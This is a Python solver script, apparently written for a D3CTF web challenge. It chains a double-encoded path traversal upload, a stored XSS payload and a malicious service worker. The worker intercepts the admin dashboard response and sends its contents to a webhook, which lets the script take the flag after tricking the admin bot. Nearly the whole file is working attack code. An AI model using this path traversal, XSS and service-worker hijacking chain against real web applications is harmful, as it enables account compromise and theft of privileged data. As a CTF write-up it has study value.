import requests
import re
from urllib.parse import unquote

url = 'https://rf4sdyoh5rowsie75prgkmwrjxm.cloud.d3c.tf'
s = requests.Session()

def upload(path, content):
    res = s.post(f'{url}/upload', data={
        'path': path,
        'content': content
    })

    assert 'Uploaded' in res.text
    print(f"> Uploaded {path}")

# upload service worker
upload('/u/guest/%252e%252e/sw.js', '''
self.addEventListener('install', e => self.skipWaiting());

self.addEventListener('activate', e =>
    e.waitUntil(Promise.all([
        self.clients.claim(),
        self.registration.navigationPreload.enable()
    ]))
);

self.addEventListener('fetch', event => {
  if (event.request.url.includes('/u/admin/dashboard')) {
    event.respondWith((async () => {
        let res = await event.preloadResponse;
        
        const body = await res.clone().text();
        
        fetch(`/webhook/guest?e=${encodeURIComponent(body)}`);
    })());
  }
});
''')

# xss
path = '/u/guest/index.html'

payload = '''
<script>
    navigator.serviceWorker.register('/u/sw.js', { scope: '/u/' })
        .then(() => location.href = '/u/admin/dashboard') 
        .catch(e => fetch(`/webhook/guest?e=${encodeURIComponent(e.message)}`));
</script>
'''.strip()

upload(path, payload)

res = s.get(f'{url}/bot', params={
    'url': url.replace('https', 'http') + path
})

print("> Reported payload")

# get flag
res = s.get(f'{url}/inbox')

flag = re.findall(r'(d3ctf{.+?})', unquote(res.text))[0].strip()
print("Flag:", flag)